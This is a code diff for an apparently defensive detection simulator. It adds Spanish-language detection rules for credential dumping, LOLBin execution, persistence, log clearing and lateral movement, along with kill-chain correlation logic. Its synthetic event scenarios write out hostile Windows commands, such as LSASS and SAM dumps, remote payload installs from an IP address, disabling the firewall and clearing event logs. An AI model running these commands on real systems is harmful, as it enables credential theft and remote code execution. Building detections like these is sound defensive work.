@@ -173,6 +173,170 @@ export const RULES: RuleMeta[] = [
       { field: 'process.command_line', operator: 'contains', value: 'delete shadows' },
     ],
   },
+  {
+    id: '3e6a9c15-8d47-4b2e-9f01-5a8c3d7e2b55',
+    name: 'Volcado del registro SAM',
+    description:
+      'Detecta el volcado de la colmena del registro SAM con reg.exe save, técnica de acceso a credenciales que extrae los hashes de las cuentas locales sin tocar LSASS ni usar herramientas ofensivas.',
+    severity: 'critical',
+    event_type: 'process.create',
+    mitre: 'T1003.002',
+    tactic: 'OS Credential Dumping: Security Account Manager',
+    tags: ['attack.t1003.002', 'attack.credential-access'],
+    conditions: [
+      { field: 'process.name', operator: 'eq', value: 'reg.exe' },
+      { field: 'process.command_line', operator: 'contains', value: ' save ' },
+      { field: 'process.command_line', operator: 'contains_any', value: ['HKLM\\SAM', 'HKLM\\SYSTEM'] },
+    ],
+  },
+  {
+    id: '4f7b0d26-9e58-4c3f-a112-6b9d4e8f3c66',
+    name: 'Volcado de LSASS con procdump',
+    description:
+      'Detecta el volcado de memoria de LSASS con procdump, variante que abusa de un binario firmado de Sysinternals para evadir políticas de aplicación mientras captura las credenciales en claro del equipo.',
+    severity: 'critical',
+    event_type: 'process.create',
+    mitre: 'T1003.001',
+    tactic: 'OS Credential Dumping: LSASS Memory',
+    tags: ['attack.t1003.001', 'attack.credential-access'],
+    conditions: [
+      { field: 'process.name', operator: 'eq', value: 'procdump.exe' },
+      { field: 'process.command_line', operator: 'contains', value: '-ma' },
+      { field: 'process.command_line', operator: 'contains', value: 'lsass' },
+    ],
+  },
+  {
+    id: '5a8c1e37-af69-4d40-b223-7cae5f9a4d77',
+    name: 'Ejecución de scripts con regsvr32',
+    description:
+      'Detecta la ejecución de scriptlets remotos o locales mediante regsvr32 con scrobj.dll, técnica LOLBas que ejecuta código firmado por el binario de Windows y evita controles de aplicación clásicos.',
+    severity: 'high',
+    event_type: 'process.create',
+    mitre: 'T1218.010',
+    tactic: 'System Binary Proxy Execution: Regsvr32',
+    tags: ['attack.t1218.010', 'attack.defense-evasion'],
+    conditions: [
+      { field: 'process.name', operator: 'eq', value: 'regsvr32.exe' },
+      { field: 'process.command_line', operator: 'contains_any', value: ['/i:http', 'scrobj.dll'] },
+    ],
+  },
+  {
+    id: '6b9d2f48-b07a-4e51-8334-8dbf60ab5e88',
+    name: 'Instalación remota con msiexec',
+    description:
+      'Detecta la instalación de paquetes MSI directamente desde URLs remotas con msiexec, vía de ejecución que salta el disco y las pasarelas de correo al no existir un fichero adjunto que analizar.',
+    severity: 'high',
+    event_type: 'process.create',
+    mitre: 'T1218.005',
+    tactic: 'System Binary Proxy Execution: Msiexec',
+    tags: ['attack.t1218.005', 'attack.defense-evasion'],
+    conditions: [
+      { field: 'process.name', operator: 'eq', value: 'msiexec.exe' },
+      { field: 'process.command_line', operator: 'contains', value: '/i' },
+      { field: 'process.command_line', operator: 'contains', value: 'http' },
+    ],
+  },
+  {
+    id: '7cae3059-c18b-4f62-9445-9ec071bc6f99',
+    name: 'Desactivación del firewall de Windows',
+    description:
+      'Detecta la desactivación de perfiles del firewall de Windows con netsh advfirewall, paso habitual para abrir el tráfico de red antes del movimiento lateral o para mantener canales de mando encubiertos.',
+    severity: 'high',
+    event_type: 'process.create',
+    mitre: 'T1562.004',
+    tactic: 'Impair Defenses: Disable or Modify System Firewall',
+    tags: ['attack.t1562.004', 'attack.defense-evasion'],
+    conditions: [
+      { field: 'process.name', operator: 'eq', value: 'netsh.exe' },
+      { field: 'process.command_line', operator: 'contains', value: 'advfirewall' },
+      { field: 'process.command_line', operator: 'contains', value: 'state off' },
+    ],
+  },
+  {
+    id: '8dbf416a-d29c-4073-a556-afd182cd70aa',
+    name: 'Borrado de registros de eventos',
+    description:
+      'Detecta el borrado de canales de registro de eventos con wevtutil (cl o clear-log), técnica de encubrimiento que destruye las trazas forenses justo antes o después de la acción destructiva.',
+    severity: 'high',
+    event_type: 'process.create',
+    mitre: 'T1070.001',
+    tactic: 'Indicator Removal: Clear Windows Event Logs',
+    tags: ['attack.t1070.001', 'attack.defense-evasion'],
+    conditions: [
+      { field: 'process.name', operator: 'eq', value: 'wevtutil.exe' },
+      { field: 'process.command_line', operator: 'contains_any', value: [' cl ', 'clear-log'] },
+    ],
+  },
+  {
+    id: '9ec0527b-e3ad-4184-b667-be92593de81b',
+    name: 'Persistencia en clave Run',
+    description:
+      'Detecta la escritura de valores en claves Run del registro, el mecanismo de persistencia más clásico: cualquier binario allí se relanza en cada inicio de sesión sin requerir privilegios.',
+    severity: 'high',
+    event_type: 'process.create',
+    mitre: 'T1547.001',
+    tactic: 'Boot or Logon Autostart Execution: Registry Run Keys',
+    tags: ['attack.t1547.001', 'attack.persistence'],
+    conditions: [
+      { field: 'process.name', operator: 'eq', value: 'reg.exe' },
+      { field: 'process.command_line', operator: 'contains', value: ' add ' },
+      { field: 'process.command_line', operator: 'contains_any', value: ['CurrentVersion\\Run', 'CurrentVersion\\RunOnce'] },
+    ],
+  },
+  {
+    id: 'afd1638c-f4be-4295-c778-cfa36a4ef92c',
+    name: 'Movimiento lateral con PsExec',
+    description:
+      'Detecta la ejecución remota de procesos con PsExec contra otros equipos, técnica estándar de movimiento lateral que abusa de recursos administrativos y deja servicios temporales en el destino.',
+    severity: 'high',
+    event_type: 'process.create',
+    mitre: 'T1021.002',
+    tactic: 'Remote Services: SMB/Windows Admin Shares',
+    tags: ['attack.t1021.002', 'attack.lateral-movement'],
+    conditions: [
+      { field: 'process.name', operator: 'eq', value: 'psexec.exe' },
+      { field: 'process.command_line', operator: 'contains', value: '\\\\' },
+    ],
+  },
+]
+
+// ---------------------------------------------------------------------------
+// Kill-chain sequences (1:1 port of sequences/kill-chains.yaml)
+
+export type SimSequence = {
+  id: string
+  name: string
+  severity: SfAlert['severity']
+  windowMs: number
+  tags: string[]
+  steps: string[]
+}
+
+export const SEQUENCES: SimSequence[] = [
+  {
+    id: 'c0a5e7d1-1a2b-4c3d-8e4f-a5b6c7d8e9f0',
+    name: 'Campaña de robo de credenciales',
+    severity: 'critical',
+    windowMs: 300_000,
+    tags: ['attack.t1003', 'attack.credential-access', 'correlacion'],
+    steps: ['Volcado de LSASS via comsvcs.dll', 'Volcado de LSASS con procdump', 'Volcado del registro SAM'],
+  },
+  {
+    id: 'd1b6f8e2-2b3c-4d4e-9f50-b6c7d8e9f0a1',
+    name: 'Campaña de intrusión completa',
+    severity: 'critical',
+    windowMs: 300_000,
+    tags: ['attack.t1105', 'attack.t1053.005', 'attack.t1490', 'correlacion'],
+    steps: ['Descarga con certutil o bitsadmin', 'Creación de tarea programada', 'Borrado de instantáneas VSS'],
+  },
+  {
+    id: 'e2c7a9f3-3c4d-4e5f-a061-c7d8e9f0a1b2',
+    name: 'Apagón defensivo',
+    severity: 'critical',
+    windowMs: 300_000,
+    tags: ['attack.t1562', 'attack.t1070.001', 'attack.defense-evasion', 'correlacion'],
+    steps: ['Manipulación de Windows Defender', 'Desactivación del firewall de Windows', 'Borrado de registros de eventos'],
+  },
 ]
 
 function field(ev: SfEvent, path: string): string | undefined {
@@ -470,6 +634,158 @@ const SCENARIOS: Scenario[] = [
       },
     }),
   },
+  {
+    weight: 2,
+    offensive: true,
+    make: () => ({
+      id: crypto.randomUUID(),
+      timestamp: nowIso(),
+      type: 'process.create',
+      source: 'etw-microsoft-windows-process',
+      host: pick(HOSTS),
+      user: pick(USERS),
+      process: {
+        pid: randPid(),
+        ppid: randPid(),
+        name: 'msiexec.exe',
+        command_line: 'msiexec.exe /q /i http://185.220.101.47/payload.msi',
+        image: 'C:\\Windows\\System32\\msiexec.exe',
+      },
+    }),
+  },
+  {
+    weight: 2,
+    offensive: true,
+    make: () => ({
+      id: crypto.randomUUID(),
+      timestamp: nowIso(),
+      type: 'process.create',
+      source: 'etw-microsoft-windows-process',
+      host: pick(HOSTS),
+      user: pick(USERS),
+      process: {
+        pid: randPid(),
+        ppid: randPid(),
+        name: 'procdump.exe',
+        command_line: 'procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass2.dmp',
+        image: 'C:\\Windows\\System32\\procdump.exe',
+      },
+    }),
+  },
+  {
+    weight: 2,
+    offensive: true,
+    make: () => ({
+      id: crypto.randomUUID(),
+      timestamp: nowIso(),
+      type: 'process.create',
+      source: 'etw-microsoft-windows-process',
+      host: pick(HOSTS),
+      user: pick(USERS),
+      process: {
+        pid: randPid(),
+        ppid: randPid(),
+        name: 'reg.exe',
+        command_line: 'reg.exe save HKLM\\SAM C:\\Users\\Public\\sam.hiv',
+        image: 'C:\\Windows\\System32\\reg.exe',
+      },
+    }),
+  },
+  {
+    weight: 2,
+    offensive: true,
+    make: () => ({
+      id: crypto.randomUUID(),
+      timestamp: nowIso(),
+      type: 'process.create',
+      source: 'etw-microsoft-windows-process',
+      host: pick(HOSTS),
+      user: pick(USERS),
+      process: {
+        pid: randPid(),
+        ppid: randPid(),
+        name: 'reg.exe',
+        command_line: 'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveSync /t REG_SZ /d C:\\Users\\Public\\payload.exe /f',
+        image: 'C:\\Windows\\System32\\reg.exe',
+      },
+    }),
+  },
+  {
+    weight: 1,
+    offensive: true,
+    make: () => ({
+      id: crypto.randomUUID(),
+      timestamp: nowIso(),
+      type: 'process.create',
+      source: 'etw-microsoft-windows-process',
+      host: pick(HOSTS),
+      user: pick(USERS),
+      process: {
+        pid: randPid(),
+        ppid: randPid(),
+        name: 'psexec.exe',
+        command_line: 'psexec.exe \\\\LAB-WKS-02 -accepteula -c C:\\Users\\Public\\payload.exe',
+        image: 'C:\\Windows\\System32\\psexec.exe',
+      },
+    }),
+  },
+  {
+    weight: 2,
+    offensive: true,
+    make: () => ({
+      id: crypto.randomUUID(),
+      timestamp: nowIso(),
+      type: 'process.create',
+      source: 'etw-microsoft-windows-process',
+      host: pick(HOSTS),
+      user: pick(USERS),
+      process: {
+        pid: randPid(),
+        ppid: randPid(),
+        name: 'netsh.exe',
+        command_line: 'netsh.exe advfirewall set allprofiles state off',
+        image: 'C:\\Windows\\System32\\netsh.exe',
+      },
+    }),
+  },
+  {
+    weight: 2,
+    offensive: true,
+    make: () => ({
+      id: crypto.randomUUID(),
+      timestamp: nowIso(),
+      type: 'process.create',
+      source: 'etw-microsoft-windows-process',
+      host: pick(HOSTS),
+      user: pick(USERS),
+      process: {
+        pid: randPid(),
+        ppid: randPid(),
+        name: 'wevtutil.exe',
+        command_line: 'wevtutil.exe cl Security',
+        image: 'C:\\Windows\\System32\\wevtutil.exe',
+      },
+    }),
+  },
+  {
+    weight: 1,
+    offensive: true,
+    make: () => ({
+      id: crypto.randomUUID(),
+      timestamp: nowIso(),
+      type: 'process.create',
+      source: 'etw-microsoft-windows-process',
+      host: pick(HOSTS),
+      user: pick(USERS),
+      process: {
+        pid: randPid(),
+        ppid: randPid(),
+        name: 'regsvr32.exe',
+        command_line: 'regsvr32.exe /u /i:http://185.220.101.47/scrobj.dll scrobj',
+        image: 'C:\\Windows\\System32\\regsvr32.exe',
+      },
+    }),
+  },
 ]
 
 const TOTAL_WEIGHT = SCENARIOS.reduce((acc, s) => acc + s.weight, 0)
@@ -534,6 +850,7 @@ export class SimEngine {
   private bySeverity: Record<string, number> = {}
   private recentTimestamps: number[] = []
   private lastAlertPerRule = new Map<string, number>()
+  private seqProgress = new Map<string, { matched: Set<number>; first: number }>()
   private timer: ReturnType<typeof setInterval> | null = null
   private statsTimer: ReturnType<typeof setInterval> | null = null
 
@@ -564,9 +881,11 @@ export class SimEngine {
     this.recentTimestamps.push(Date.now())
     this.onEvent(ev)
 
+    const firedRules: string[] = []
     for (const rule of RULES) {
       const matched = evaluate(rule, ev)
       if (!matched) continue
+      firedRules.push(rule.name)
       const last = this.lastAlertPerRule.get(rule.id) ?? 0
       if (Date.now() - last < 60_000) continue // same dedup window as internal/alert
       this.lastAlertPerRule.set(rule.id, Date.now())
@@ -587,6 +906,52 @@ export class SimEngine {
       this.alertsTotal++
       this.bySeverity[alert.severity] = (this.bySeverity[alert.severity] ?? 0) + 1
       this.onAlert(alert)
+    }
+    this.checkSequences(ev, firedRules)
+  }
+
+  /** Kill-chain correlation, same semantics as internal/correlate. */
+  private checkSequences(ev: SfEvent, firedRules: string[]) {
+    const now = Date.now()
+    for (const seq of SEQUENCES) {
+      const key = `${seq.id}|${ev.host}`
+      let st = this.seqProgress.get(key)
+      if (!st) {
+        st = { matched: new Set(), first: now }
+      } else if (st.matched.size > 0 && now - st.first > seq.windowMs) {
+        st = { matched: new Set(), first: now } // window expired, restart
+      }
+      let advanced = false
+      for (let i = 0; i < seq.steps.length; i++) {
+        if (!st.matched.has(i) && firedRules.includes(seq.steps[i])) {
+          st.matched.add(i)
+          advanced = true
+          break
+        }
+      }
+      if (!advanced) continue
+      if (st.matched.size === seq.steps.length) {
+        const alert: SfAlert = {
+          id: crypto.randomUUID(),
+          timestamp: nowIso(),
+          rule_id: seq.id,
+          rule_name: seq.name,
+          severity: seq.severity,
+          host: ev.host,
+          user: ev.user,
+          event_id: ev.id,
+          event_type: ev.type,
+          summary: `${seq.steps.join(' -> ')} en ${seq.steps.length} pasos`,
+          matched_on: seq.steps,
+          tags: seq.tags,
+        }
+        this.alertsTotal++
+        this.bySeverity[alert.severity] = (this.bySeverity[alert.severity] ?? 0) + 1
+        this.onAlert(alert)
+        this.seqProgress.delete(key) // re-arm
+        continue
+      }
+      this.seqProgress.set(key, st)
     }
   }
 
